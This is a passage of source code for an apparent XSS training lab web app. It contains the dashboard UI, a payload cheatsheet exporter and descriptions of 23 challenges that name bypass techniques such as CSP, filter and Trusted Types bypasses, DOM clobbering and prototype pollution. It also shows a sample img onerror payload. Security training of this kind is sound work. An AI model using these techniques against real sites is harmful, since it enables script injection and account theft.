    .stats { display: flex; gap: 1rem; margin-bottom: 2rem; }
    .stat { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 1rem 1.5rem; }
    .stat .num { font-size: 1.5rem; font-weight: 700; color: #58a6ff; }
    .stat .label { font-size: 0.75rem; color: #8b949e; text-transform: uppercase; letter-spacing: 0.05em; }
    table { width: 100%; border-collapse: collapse; background: #161b22; border: 1px solid #30363d; border-radius: 12px; overflow: hidden; }
    th { background: #21262d; padding: 0.75rem 1rem; text-align: left; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; color: #8b949e; }
    td { padding: 0.75rem 1rem; border-top: 1px solid #21262d; font-size: 0.85rem; vertical-align: top; }
    code { color: #c9d1d9; }
    .export-btn { display: inline-block; margin-top: 1.5rem; padding: 0.6rem 1.5rem; background: #238636; border: 1px solid #2ea043; border-radius: 8px; color: #fff; text-decoration: none; font-size: 0.85rem; font-weight: 600; cursor: pointer; border: none; }
    .export-btn:hover { background: #2ea043; }
  </style>
</head>
<body>
  <div class="nav"><a href="/">&larr; Back to Dashboard</a></div>
  <h1>XSS Payload Cheat Sheet</h1>
  <p class="subtitle">Your collected payloads from the XSS Training Lab</p>
  <div class="stats">
    <div class="stat"><div class="num">${solvedCount}</div><div class="label">Levels Solved</div></div>
    <div class="stat"><div class="num">${23 - solvedCount}</div><div class="label">Remaining</div></div>
    <div class="stat"><div class="num">${totalPayloads}</div><div class="label">Payloads Collected</div></div>
  </div>
  <table>
    <thead><tr><th>Level</th><th>Challenge</th><th>Context</th><th>Defense</th><th>Status</th><th>Your Payloads</th></tr></thead>
    <tbody>${rows}</tbody>
  </table>
  <button class="export-btn" onclick="exportCheatSheet()">Export as Markdown</button>
  <script>
    function exportCheatSheet() {
      fetch('/api/solutions').then(function(r) { return r.json(); }).then(function(sols) {
        var md = '# XSS Payload Cheat Sheet\\n\\nGenerated from XSS Training Lab\\n\\n';
        var meta = ${metaJSON};
        for (var i = 1; i <= 23; i++) {
          var m = meta[i];
          md += '## Level ' + i + ': ' + m.name + '\\n';
          md += '- **Difficulty:** ' + m.diff + '\\n';
          md += '- **Context:** ' + m.context + '\\n';
          md += '- **Defense:** ' + m.defense + '\\n';
          if (sols[i]) {
            md += '- **Status:** Solved\\n';
            md += '- **Payloads:**\\n';
            sols[i].payloads.forEach(function(p) { md += '  - \\x60' + p + '\\x60\\n'; });
          } else {
            md += '- **Status:** Unsolved\\n';
          }
          md += '\\n';
        }
        var blob = new Blob([md], { type: 'text/markdown' });
        var a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'xss-cheatsheet.md';
        a.click();
      });
    }
  </script>
</body>
</html>`);
});

// ============================================================
// DASHBOARD
// ============================================================
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Z1Y4D XSS LAB // NEURAL LINK</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;600;700&display=swap"
    rel="stylesheet" />
  <style>
    :root {
      --bg: #03040b;
      --bg-glass: rgba(10, 12, 27, 0.6);
      --border: rgba(0, 243, 255, 0.2);
      --text: #e0f2fe;
      --text-dim: #7dd3fc;
      --neon-cyan: #00f3ff;
      --neon-purple: #b026ff;
      --neon-pink: #ff00ea;

      --easy: #00ffa3;
      --medium: #fde047;
      --hard: #fb7185;
      --expert: #c084fc;

      --font-mono: 'JetBrains Mono', monospace;
      --font-head: 'Orbitron', sans-serif;
      --font-body: 'Rajdhani', sans-serif;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: var(--bg);
      color: var(--text);
      font-family: var(--font-body);
      overflow-x: hidden;
      min-height: 100vh;
      background-image:
        radial-gradient(circle at 15% 50%, rgba(176, 38, 255, 0.05), transparent 25%),
        radial-gradient(circle at 85% 30%, rgba(0, 243, 255, 0.05), transparent 25%);
    }

    /* Ambient Zero-Gravity Particles */
    .particles {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 0;
      overflow: hidden;
    }

    .particle {
      position: absolute;
      border-radius: 50%;
      background: var(--neon-cyan);
      box-shadow: 0 0 10px var(--neon-cyan);
      opacity: 0.5;
      animation: float 20s infinite linear;
    }

    @keyframes float {
      0% {
        transform: translateY(110vh) translateX(0) scale(0);
        opacity: 0;
      }

      10% {
        opacity: 0.6;
      }

      90% {
        opacity: 0.6;
      }

      100% {
        transform: translateY(-10vh) translateX(20px) scale(1);
        opacity: 0;
      }
    }

    /* Scanlines */
    body::after {
      content: '';
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 1000;
      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
      background-size: 100% 4px;
      opacity: 0.3;
    }

    .wrapper {
      position: relative;
      z-index: 10;
      max-width: 1300px;
      margin: 0 auto;
      padding: 0 2rem;
    }

    /* NAVIGATION */
    nav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 1.5rem 0;
      border-bottom: 1px solid var(--border);
      backdrop-filter: blur(10px);
    }

    .logo {
      font-family: var(--font-head);
      font-size: 1.6rem;
      font-weight: 900;
      color: var(--text);
      text-decoration: none;
      text-transform: uppercase;
      letter-spacing: 2px;
      text-shadow: 0 0 10px rgba(0, 243, 255, 0.5);
    }

    .logo span {
      color: var(--neon-cyan);
    }

    .nav-links {
      display: flex;
      align-items: center;
      gap: 2rem;
    }

    .nav-links a {
      color: var(--text-dim);
      text-decoration: none;
      font-family: var(--font-mono);
      font-size: 0.85rem;
      transition: 0.3s;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .nav-links a:hover {
      color: var(--neon-cyan);
      text-shadow: 0 0 8px var(--neon-cyan);
    }

    .nav-links .btn-start {
      border: 1px solid var(--neon-cyan);
      padding: 0.5rem 1.2rem;
      border-radius: 4px;
      color: var(--neon-cyan);
      background: rgba(0, 243, 255, 0.05);
      box-shadow: 0 0 10px rgba(0, 243, 255, 0.1);
    }

    .nav-links .btn-start:hover {
      background: var(--neon-cyan);
      color: #000;
      box-shadow: 0 0 20px var(--neon-cyan);
    }

    /* HERO SECTION */
    .hero {
      display: flex;
      align-items: center;
      justify-content: space-between;
      min-height: 60vh;
      padding: 4rem 0;
    }

    .hero-text {
      flex: 1;
      max-width: 600px;
    }

    .hero-sys-status {
      font-family: var(--font-mono);
      font-size: 0.85rem;
      color: var(--neon-pink);
      margin-bottom: 1.5rem;
      letter-spacing: 2px;
      text-transform: uppercase;
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 0.4rem 1rem;
      border: 1px solid var(--neon-pink);
      border-radius: 2px;
      background: rgba(255, 0, 234, 0.05);
      animation: pulse-border 2s infinite;
    }

    .hero-sys-status::before {
      content: '';
      width: 8px;
      height: 8px;
      background: var(--neon-pink);
      border-radius: 50%;
      box-shadow: 0 0 10px var(--neon-pink);
      animation: blink 1s infinite alternate;
    }

    @keyframes pulse-border {

      0%,
      100% {
        box-shadow: 0 0 5px rgba(255, 0, 234, 0.2);
      }

      50% {
        box-shadow: 0 0 15px rgba(255, 0, 234, 0.6);
      }
    }

    @keyframes blink {
      100% {
        opacity: 0.3;
      }
    }

    .hero-title {
      font-family: var(--font-head);
      font-size: 4rem;
      line-height: 1.1;
      margin-bottom: 1.5rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .hero-title span {
      background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 20px rgba(0, 243, 255, 0.3);
      display: block;
    }

    .hero-desc {
      font-size: 1.25rem;
      color: var(--text-dim);
      line-height: 1.6;
      margin-bottom: 2.5rem;
      font-weight: 500;
    }

    /* 3D CORE COMPONENT */
    .hero-visual {
      flex: 1;
      display: flex;
      justify-content: flex-end;
      align-items: center;
      perspective: 1000px;
    }

    .hero-terminal {
      width: 480px;
      max-width: 100%;
      background: #0d0f16;
      border: 1px solid #272b36;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
      display: flex;
      flex-direction: column;
    }

    .hero-term-head {
      display: flex;
      align-items: center;
      padding: 0.85rem 1rem;
      background: #151822;
      border-bottom: 1px solid #272b36;
    }

    .hero-term-dots {
      display: flex;
      gap: 8px;
    }

    .hero-term-dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
    }

    .hero-term-dot.close { background: #fc5c65; }
    .hero-term-dot.min { background: #fdcb6e; }
    .hero-term-dot.max { background: #26de81; }

    .hero-term-title {
      flex: 1;
      text-align: center;
      color: #5c677f;
      font-family: "Fira Code", "JetBrains Mono", Consolas, monospace;
      font-size: 0.85rem;
      padding-right: 44px;
    }

    .hero-term-body {
      padding: 1.5rem;
      font-family: "Fira Code", "JetBrains Mono", Consolas, monospace;
      font-size: 0.9rem;
      line-height: 1.6;
      color: #e2e8f0;
      text-align: left;
    }

    .hero-line { margin-bottom: 0.65rem; }
    .hero-prompt { color: #00f3a0; font-weight: bold; margin-right: 0.5rem; }
    .hero-comment { color: #5c677f; }
    .hero-success { color: #00f3a0; font-weight: bold; }
    .hero-warn { color: #ebb134; font-weight: bold; }
    .hero-purple { color: #a855f7; }
    .hero-cursor {
      display: inline-block;
      width: 10px;
      height: 16px;
      background: #00f3a0;
      vertical-align: text-bottom;
      animation: blink 1s step-end infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    /* STATS DASHBOARD */
    .dashboard {
      background: var(--bg-glass);
      backdrop-filter: blur(12px);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 2.5rem;
      margin-bottom: 4rem;
      display: flex;
      flex-wrap: wrap;
      gap: 3rem;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
      position: relative;
      overflow: hidden;
    }

    .dashboard::before {
      content: '';
      position: absolute;
      left: 0;
      top: 0;
      width: 4px;
      height: 100%;
      background: linear-gradient(to bottom, var(--neon-cyan), var(--neon-purple));
    }

    .dash-box {
      flex: 1;
      min-width: 140px;
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
    }

    .dash-label {
      font-family: var(--font-mono);
      font-size: 0.85rem;
      color: var(--text-dim);
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .dash-val {
      font-family: var(--font-head);
      font-size: 2.8rem;
      font-weight: 700;
      line-height: 1;
    }

    .dash-val.easy {
      color: var(--easy);
      text-shadow: 0 0 15px rgba(0, 255, 163, 0.4);
    }

    .dash-val.medium {
      color: var(--medium);
      text-shadow: 0 0 15px rgba(253, 224, 71, 0.4);
    }

    .dash-val.hard {
      color: var(--hard);
      text-shadow: 0 0 15px rgba(251, 113, 133, 0.4);
    }

    .dash-val.expert {
      color: var(--expert);
      text-shadow: 0 0 15px rgba(192, 132, 252, 0.4);
    }

    .dash-val.total {
      color: var(--neon-cyan);
      text-shadow: 0 0 15px rgba(0, 243, 255, 0.4);
    }

    .dash-divider {
      width: 1px;
      background: var(--border);
    }

    .dash-reset-btn {
      background: rgba(251, 113, 133, 0.12);
      border: 1px solid rgba(251, 113, 133, 0.45);
      color: #ffd4dc;
      font-family: var(--font-mono);
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 0.85rem;
      padding: 0.7rem 1rem;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.2s ease;
      width: fit-content;
    }

    .dash-reset-btn:hover {
      background: rgba(251, 113, 133, 0.2);
      box-shadow: 0 0 14px rgba(251, 113, 133, 0.35);
      transform: translateY(-1px);
    }

    /* PROGRESS BAR */
    .progress-container {
      width: 100%;
      grid-column: 1 / -1;
      margin-top: 1rem;
    }

    .progress-header {
      display: flex;
      justify-content: space-between;
      margin-bottom: 0.8rem;
      font-family: var(--font-mono);
      font-size: 0.85rem;
      color: var(--neon-cyan);
    }

    .progress-track {
      width: 100%;
      height: 8px;
      background: rgba(0, 0, 0, 0.5);
      border-radius: 4px;
      overflow: hidden;
      border: 1px solid var(--border);
    }

    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, var(--neon-purple), var(--neon-cyan));
      box-shadow: 0 0 15px var(--neon-cyan);
      transition: width 1.2s cubic-bezier(0.16, 1, 0.3, 1);
    }

    /* FILTER BAR */
    .controls {
      display: flex;
      align-items: center;
      gap: 1rem;
      margin-bottom: 2.5rem;
      flex-wrap: wrap;
    }

    .controls-label {
      font-family: var(--font-mono);
      color: var(--text-dim);
      text-transform: uppercase;
      font-size: 0.85rem;
      letter-spacing: 2px;
      margin-right: 1rem;
    }

    .filter-btn {
      background: rgba(0, 0, 0, 0.4);
      border: 1px solid rgba(255, 255, 255, 0.1);
      color: var(--text-dim);
      padding: 0.6rem 1.4rem;
      font-family: var(--font-mono);
      font-size: 0.8rem;
      cursor: pointer;
      text-transform: uppercase;
      border-radius: 4px;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .filter-btn::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 2px;
      background: var(--neon-cyan);
      transform: scaleX(0);
      transition: transform 0.3s;
    }

    .filter-btn:hover {
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
    }

    .filter-btn:hover::after {
      transform: scaleX(1);
    }

    .filter-btn.active {
      border-color: var(--neon-cyan);
      color: var(--neon-cyan);
      background: rgba(0, 243, 255, 0.05);
      box-shadow: 0 0 15px rgba(0, 243, 255, 0.15);
    }

    .filter-btn.active::after {
      transform: scaleX(1);
    }

    .filter-btn[data-diff="easy"].active {
      border-color: var(--easy);
      color: var(--easy);
    }

    .filter-btn[data-diff="medium"].active {
      border-color: var(--medium);
      color: var(--medium);
    }

    .filter-btn[data-diff="hard"].active {
      border-color: var(--hard);
      color: var(--hard);
    }

    .filter-btn[data-diff="expert"].active {
      border-color: var(--expert);
      color: var(--expert);
    }

    /* CARD GRID */
    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
      gap: 2.5rem;
      padding-bottom: 6rem;
      perspective: 1200px;
    }

    .card-wrapper {
      height: 100%;
    }

    .card {
      background: var(--bg-glass);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.05);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      border-radius: 8px;
      padding: 2.5rem 2rem;
      height: 100%;
      text-decoration: none;
      color: inherit;
      display: flex;
      flex-direction: column;
      transition: box-shadow 0.3s, border-color 0.3s;
      position: relative;
      overflow: hidden;
      z-index: 1;
    }

    .card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 3px;
      background: var(--diff-color);
      box-shadow: 0 0 15px var(--diff-color);
      transform: scaleX(0);
      transform-origin: left;
      transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .card:hover::before {
      transform: scaleX(1);
    }

    .card:hover {
      border-color: rgba(255, 255, 255, 0.15);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7), 0 0 30px rgba(0, 243, 255, 0.05);
    }

    /* Ambient hover glow inside card */
    .card-glow {
      position: absolute;
      width: 150px;
      height: 150px;
      background: var(--diff-color);
      filter: blur(80px);
      opacity: 0;
      transition: opacity 0.4s;
      border-radius: 50%;
      top: -50px;
      right: -50px;
      z-index: -1;
      pointer-events: none;
    }

    .card:hover .card-glow {
      opacity: 0.15;
    }

    /* 3D Inner elements */
    .card-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
      transform: translateZ(30px);
    }

    .card-num {
      font-family: var(--font-mono);
      font-size: 0.8rem;
      color: rgba(255, 255, 255, 0.4);
      letter-spacing: 2px;
    }

    .diff-badge {
      font-family: var(--font-mono);
      font-size: 0.65rem;
      padding: 0.3rem 0.6rem;
      border-radius: 3px;
      font-weight: bold;
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid var(--diff-color);
      color: var(--diff-color);
      text-transform: uppercase;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
      letter-spacing: 1px;
    }

    .card-title {
      font-size: 1.4rem;
      font-weight: 700;
      margin-bottom: 1rem;
      transform: translateZ(40px);
      line-height: 1.3;
    }

    .card-desc {
      font-size: 1.05rem;
      color: var(--text-dim);
      line-height: 1.6;
      flex-grow: 1;
      transform: translateZ(25px);
      font-weight: 500;
    }

    .card-footer-action {
      margin-top: 2rem;
      display: flex;
      align-items: center;
      color: var(--diff-color);
      font-family: var(--font-mono);
      font-size: 0.8rem;
      text-transform: uppercase;
      transform: translateZ(35px);
      opacity: 0.7;
      transition: opacity 0.3s;
    }

    .card:hover .card-footer-action {
      opacity: 1;
    }

    .card-footer-action svg {
      margin-left: 10px;
      transition: transform 0.3s;
    }

    .card:hover .card-footer-action svg {
      transform: translateX(5px);
    }

    .solved-indicator {
      position: absolute;
      top: 1rem;
      right: 1rem;
      color: var(--easy);
      transform: translateZ(50px);
      font-size: 1.2rem;
      display: none;
      text-shadow: 0 0 10px var(--easy);
    }

    .card.solved .solved-indicator {
      display: block;
    }

    .card.solved {
      background: rgba(0, 255, 163, 0.05);
      border-color: rgba(0, 255, 163, 0.2);
    }

    .card-wrapper.hidden {
      display: none;
    }

    /* FOOTER */
    footer {
      border-top: 1px solid var(--border);
      padding: 3rem 0;
      margin-top: 2rem;
      display: flex;
      justify-content: space-between;
      font-family: var(--font-mono);
      font-size: 0.85rem;
      color: var(--text-dim);
      backdrop-filter: blur(5px);
    }

    .footer-left span {
      color: var(--neon-cyan);
    }

    footer a {
      color: var(--text);
      text-decoration: none;
      transition: 0.3s;
    }

    footer a:hover {
      color: var(--neon-pink);
      text-shadow: 0 0 8px var(--neon-pink);
    }

    .footer-links {
      display: flex;
      gap: 2rem;
    }

    /* TOAST */
    #toast {
      position: fixed;
      bottom: 30px;
      right: 30px;
      background: rgba(10, 12, 27, 0.95);
      border: 1px solid var(--neon-cyan);
      box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
      padding: 1.2rem 2rem;
      border-radius: 4px;
      font-family: var(--font-mono);
      font-size: 0.95rem;
      z-index: 9999;
      transform: translateX(120%);
      transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      display: flex;
      align-items: center;
      gap: 15px;
      border-left: 4px solid var(--neon-cyan);
    }

    #toast.show {
      transform: translateX(0);
    }

    #toast::before {
      content: '[SYS]';
      color: var(--neon-cyan);
      font-weight: bold;
      letter-spacing: 1px;
    }

    @media (max-width: 900px) {
      .hero {
        flex-direction: column;
        text-align: center;
        padding: 2rem 0;
      }

      .hero-sys-status {
        justify-content: center;
      }

      .hero-title {
        font-size: 3rem;
      }

      .hero-visual {
        margin-top: 3rem;
        justify-content: center;
        transform: scale(0.8);
      }

      .dashboard {
        gap: 1.5rem;
        padding: 1.5rem;
      }

      .dash-divider {
        display: none;
      }

      .nav-links a {
        margin-left: 1rem;
        font-size: 0.75rem;
      }

      nav {
        flex-direction: column;
        gap: 1rem;
      }
    }
  </style>
</head>

<body>
  <div class="particles" id="particles"></div>

  <div class="wrapper">
    <!-- NAVIGATION -->
    <nav>
      <a href="/" class="logo">Z1Y4D <span>XSS LAB</span></a>
      <div class="nav-links">
        <a href="/cheatsheet">Cheatsheet</a>
        <a href="#dashboard">Dashboard</a>
        <a href="/level/1" class="btn-start">INITIATE LINK</a>
      </div>
    </nav>

    <!-- HERO -->
    <section class="hero">
      <div class="hero-text">
        <div class="hero-sys-status">Neural Link Established</div>
        <h1 class="hero-title">Master XSS. <br><span>Break The Web.</span></h1>
        <p class="hero-desc">23 progressively intense challenges embedded in a hyper-realistic zero-gravity environment.
          From simple reflections to DOM clobbering and prototype pollution. Connect, exploit, and elevate your
          privileges.</p>
      </div>
      <div class="hero-visual">
        <div class="hero-terminal">
          <div class="hero-term-head">
            <div class="hero-term-dots">
              <div class="hero-term-dot close"></div>
              <div class="hero-term-dot min"></div>
              <div class="hero-term-dot max"></div>
            </div>
            <div class="hero-term-title">xss-lab &mdash; bash</div>
          </div>
          <div class="hero-term-body">
            <div class="hero-line"><span class="hero-prompt">~</span> curl http://lab.example.com/level/1?q=test</div>
            <div class="hero-line hero-comment">&lt;!-- Reflected: No defenses --&gt;</div>
            <br>
            <div class="hero-line"><span class="hero-prompt">~</span> inject "&lt;img src=x onerror=alert(1)&gt;"</div>
            <div class="hero-line hero-success">&#10003; XSS triggered &mdash; Level 1 solved!</div>
            <br>
            <div class="hero-line"><span class="hero-prompt">~</span> cd level/17 # CSP strict-dynamic</div>
            <div class="hero-line hero-warn">&#9888; Content-Security-Policy blocked inline script</div>
            <div class="hero-line hero-comment"># Hint: nonce prediction + trusted types...</div>
            <br>
            <div class="hero-line"><span class="hero-prompt">~</span> bypass --method=trusted-types</div>
            <div class="hero-line hero-success">&#10003; CSP bypassed &mdash; Level 17 solved!</div>
            <br>
            <div class="hero-line"><span class="hero-prompt">~</span> <span class="hero-purple">completing all 23 levels...</span></div>
            <div class="hero-line"><span class="hero-prompt">~</span><span class="hero-cursor"></span></div>
          </div>
        </div>
      </div>
    </section>

    <!-- DASHBOARD -->
    <section class="dashboard" id="dashboard">
      <div class="dash-box">
        <div class="dash-label">Total Levels</div>
        <div class="dash-val total">23</div>
      </div>
      <div class="dash-divider"></div>
      <div class="dash-box">
        <div class="dash-label">Easy</div>
        <div class="dash-val easy">5</div>
      </div>
      <div class="dash-box">
        <div class="dash-label">Medium</div>
        <div class="dash-val medium">6</div>
      </div>
      <div class="dash-box">
        <div class="dash-label">Hard</div>
        <div class="dash-val hard">7</div>
      </div>
      <div class="dash-box">
        <div class="dash-label">Expert</div>
        <div class="dash-val expert">5</div>
      </div>
      <div class="dash-divider"></div>
      <div class="dash-box">
        <div class="dash-label">Hacked</div>
        <div class="dash-val total" id="solved-count">0</div>
      </div>
      <div class="dash-box">
        <div class="dash-label">Reset Labs</div>
        <button class="dash-reset-btn" onclick="resetProgress(event)">Reset</button>
      </div>
      <div class="progress-container">
        <div class="progress-header">
          <span>HACK STATUS</span>
          <span id="prog-text">0 / 23 SECURED</span>
        </div>
        <div class="progress-track">
          <div class="progress-fill" id="prog-fill"></div>
        </div>
      </div>
    </section>

    <!-- CONTROLS -->
    <div class="controls">
      <span class="controls-label">Security Clearance:</span>
      <button class="filter-btn active" data-diff="all">All Modules</button>
      <button class="filter-btn" data-diff="easy">Easy</button>
      <button class="filter-btn" data-diff="medium">Medium</button>
      <button class="filter-btn" data-diff="hard">Hard</button>
      <button class="filter-btn" data-diff="expert">Expert</button>
    </div>

    <!-- GRID -->
    <div class="grid" id="challenge-grid">
      <!-- Injected via JS -->
    </div>

    <!-- FOOTER -->
    <footer>
      <div class="footer-left">Created for <span>Z1Y4D</span> Labs // Advanced Penetration Testing</div>
      <div class="footer-links">
        <a href="/cheatsheet">Documentation</a>
      </div>
    </footer>
  </div>

  <div id="toast">Neural link established.</div>

  <script>
    // Particle Generator
    const particlesContainer = document.getElementById('particles');
    for (let i = 0; i < 40; i++) {
      const p = document.createElement('div');
      p.className = 'particle';
      const size = Math.random() * 4 + 1;
      p.style.width = \`\${size}px\`;
      p.style.height = \`\${size}px\`;
      p.style.left = \`\${Math.random() * 100}vw\`;
      p.style.animationDuration = \`\${Math.random() * 15 + 10}s\`;
      p.style.animationDelay = \`\${Math.random() * 10}s\`;
      particlesContainer.appendChild(p);
    }

    // ── Challenge data ──────────────────────────────────────────
    const challenges = [
      { id: 1, title: 'Reflected XSS — No Defenses', diff: 'easy', desc: 'Raw input reflected directly into the HTML response. Zero sanitization.' },
      { id: 2, title: 'Stored XSS — Persistent Injection', diff: 'easy', desc: 'Your payload is saved server-side and executed for every visitor.' },
      { id: 3, title: 'Script Tag Filter Bypass', diff: 'easy', desc: 'Filter blocks <script> but dozens of other elements execute JS.' },
      { id: 4, title: 'Attribute Context Injection', diff: 'easy', desc: 'Input lands inside a double-quoted HTML attribute. Break out.' },
      { id: 5, title: 'JavaScript String Context Injection', diff: 'easy', desc: 'Inside an inline JS string. HTML-encoding won\\'t save you here.' },
      { id: 6, title: 'Event Handler Blocklist Bypass', diff: 'medium', desc: '12 common handlers blocked. The spec has 60+. Find the gaps.' },
      { id: 7, title: 'Single-Pass Keyword Filter Bypass', diff: 'medium', desc: 'Filter strips keywords once. Nesting reassembles them.' },
      { id: 8, title: 'DOM-Based XSS', diff: 'medium', desc: 'Server never sees your payload. Source → sink in client JS.' },
      { id: 9, title: 'href Injection + Protocol Filter Bypass', diff: 'medium', desc: 'javascript: blocked. But browsers decode entities before parsing URLs.' },
      { id: 10, title: 'CSP Bypass via JSONP', diff: 'medium', desc: 'CSP allows \\'self\\'. A JSONP endpoint on the same origin is your weapon.' },
      { id: 11, title: 'Double Encoding Bypass', diff: 'medium', desc: 'WAF decodes once. App decodes twice. Encode for the second pass.' },
      { id: 12, title: 'Client-Side Template Injection', diff: 'hard', desc: 'Tags stripped server-side. But {{...}} expressions still eval() client-side.' },
      { id: 13, title: 'postMessage XSS', diff: 'hard', desc: 'Page writes e.data to innerHTML without checking origin. Send a message.' },
      { id: 14, title: 'SVG Upload XSS', diff: 'hard', desc: 'SVG is XML + JS. <script> stripped, but event handlers remain.' },
      { id: 15, title: 'Mutation XSS — Template Blind Spot', diff: 'hard', desc: 'Sanitizer uses querySelectorAll — which skips <template> content.' },
      { id: 16, title: 'Recursive Filter Bypass via Context Escape', diff: 'hard', desc: 'Strong recursive filter. Escape to srcdoc iframe context.' },
      { id: 17, title: 'CSP strict-dynamic Bypass', diff: 'hard', desc: 'strict-dynamic active. Find a way to chain trusted script loading.' },
      { id: 18, title: 'DOM Clobbering', diff: 'hard', desc: 'Inject HTML that overwrites JS variables via named elements.' },
      { id: 19, title: 'Prototype Pollution XSS', diff: 'expert', desc: 'Pollute Object.prototype. Trigger execution through framework gadgets.' },
      { id: 20, title: 'Trusted Types Bypass', diff: 'expert', desc: 'Trusted Types enforced. Find a policy misconfiguration or bypass.' },
      { id: 21, title: 'Dangling Markup Injection / CSRF Leak', diff: 'expert', desc: 'No script execution possible. Steal a CSRF token via open tags.' },
      { id: 22, title: 'JSON Injection in Script Block', diff: 'expert', desc: 'Angle brackets Unicode-escaped, but you\\'re already inside a trusted <script>.' },
      { id: 23, title: 'URL Scheme Bypass via Entity Encoding', diff: 'expert', desc: 'javascript: blocked by string match. Browser entity-decodes href before parsing.' },
    ];

    const diffColors = { easy: 'var(--easy)', medium: 'var(--medium)', hard: 'var(--hard)', expert: 'var(--expert)' };

    // ── Render grid ─────────────────────────────────────────────
    function renderGrid(solved) {
      const grid = document.getElementById('challenge-grid');
      grid.innerHTML = '';
      challenges.forEach(c => {
        const isSolved = solved.includes(c.id);
        const wrapper = document.createElement('div');
        wrapper.className = \`card-wrapper\`;
        wrapper.setAttribute('data-diff', c.diff);

        const cardHtml = \`
          <a href="/level/\${c.id}" class="card \${isSolved ? 'solved' : ''}" style="--diff-color: \${diffColors[c.diff]}">
            <div class="card-glow"></div>
            <div class="solved-indicator">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
            </div>
            <div class="card-top">
              <div class="card-num">MODULE [\${String(c.id).padStart(2, '0')}]</div>
              <div class="diff-badge">\${c.diff}</div>
            </div>
            <div class="card-title">\${c.title}</div>
            <div class="card-desc">\${c.desc}</div>
            <div class="card-footer-action">
              Initialize Exploit 
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
            </div>
          </a>
        \`;
        wrapper.innerHTML = cardHtml;
        grid.appendChild(wrapper);
      });

      setup3D();
      updateProgress(solved.length);
    }

    // Parallax 3D effect on cards (Disabled to improve legibility)
    function setup3D() {
      // Intentionally left blank to stop the tilt effect.
    }

    // ── Progress ─────────────────────────────────────────────────
    function updateProgress(n) {
      const pct = (n / 23) * 100;
      document.getElementById('prog-fill').style.width = pct + '%';
      document.getElementById('prog-text').textContent = \`\${n} / 23 SECURED\`;
      document.getElementById('solved-count').textContent = n;
    }

    // ── Load solved from server ──────────────────────────────────
    async function loadProgress() {
      try {
        const r = await fetch('/api/solutions');
        if (!r.ok) return [];
        const data = await r.json();
        return Object.keys(data).map(Number);
      } catch { return []; }
    }

    // ── Filter buttons ───────────────────────────────────────────
    document.querySelectorAll('.filter-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        const diff = btn.dataset.diff;
        document.querySelectorAll('.card-wrapper').forEach(wrapper => {
          if (diff === 'all' || wrapper.dataset.diff === diff) {
            wrapper.style.display = 'block';
          } else {
            wrapper.style.display = 'none';
          }
        });
      });
    });

    // ── Reset ────────────────────────────────────────────────────
    async function resetProgress(e) {
      e.preventDefault();
      if (!confirm('WARNING: Data purge requested. Are you sure you wish to wipe all security clearance data?')) return;
      try {
        await fetch('/api/reset', { method: 'POST' });
        renderGrid([]);
        showToast('System data purged successfully.');
      } catch { showToast('ERROR: Unable to purge system data.'); }
    }

    // ── Toast ────────────────────────────────────────────────────
    function showToast(msg) {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.classList.add('show');
